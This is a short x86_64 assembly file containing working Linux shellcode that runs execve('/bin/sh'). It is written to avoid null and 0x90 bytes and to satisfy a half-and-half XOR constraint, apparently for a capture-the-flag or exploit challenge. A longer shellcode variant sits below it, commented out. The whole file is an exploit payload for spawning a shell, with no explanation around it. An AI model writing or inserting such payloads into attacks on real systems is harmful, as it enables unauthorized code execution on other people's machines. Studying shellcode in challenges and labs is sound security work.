// Linux x86_64 execve("/bin/sh"), 30 bytes total, no null, no 0x90, xor(shellcode[:15]) == xor(shellcode[15:]).
.intel_syntax noprefix

.text
.globl main

// first half is 24	
main:
	xor eax,eax
	push rax
	mov rdi, 0x68732f2f6e69622f
	push rdi
	mov rdi,rsp
	xor rsi, rsi
	xor rdx, rdx	
	mov al, 0x3b
	syscall
//  too long
// main:
// 	xor rdx, rdx
// 	mov rbx, 0x2f2f62696e2f7368
// 	shr	rbx, 0x8
// 	push rbx
// 	mov rdi, rsp
// 	push rax
// 	push rdi
// 	mov rsi, rsp
// 	mov al, 0x3b
// 	syscall
